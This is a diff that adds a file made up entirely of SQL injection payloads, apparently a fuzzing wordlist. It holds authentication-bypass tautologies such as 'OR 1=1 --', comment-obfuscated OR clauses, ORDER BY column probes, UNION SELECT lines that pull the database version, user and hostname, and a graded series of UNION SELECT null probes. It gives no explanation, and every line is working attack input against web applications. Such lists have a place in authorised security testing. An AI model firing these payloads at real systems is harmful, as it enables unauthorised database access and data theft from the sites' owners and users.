@@ -1,0 +1,32 @@
+x'/**/OR/**/'x'/**/=/**/'x
+x'/**/OR/**/'x'/**/LIKE/**/'x
+' OR 1 = 1 -- 
+a' OR 1 = 1;-- 
+' OR 1=1 # 
+a' OR ''='
+a' ORDER BY 1;# 
+x' or first_name LIKE '%a%' -- 
+x' or first_name LIKE '%a%' # 
+a' OR database() LIKE '%A%';# 
+a' UNION ALL SELECT 1, @@version;#' 
+a' UNION ALL SELECT system_user(),user() # 
+1 or user(), current_user(), current_user, system_user(), session_user() IS NOT NULL
+1 or @@hostname -- 
+1 order by 1 # 
+ 1 ORDER BY 1
+ 1 OR 1=1 # 
+1 UNION ALL SELECT @@version
+1 OR database() LIKE 1 # 
+1 or first_name IS NOT NULL # 
+1 UNION ALL SELECT user() # 
+' order by 1 # 
+1 UNION ALL SELECT system_user() # 
+' union select 1 # 
+' union select null # 
+1 union select null # 
+1 union select null # 
+1 union select null, null # 
+1 union select null, null, null # 
+1 union select null, null, null, null # 
+1 union select null, null, null, null, null # 
+1 union select null, null, null, null, null, null # 
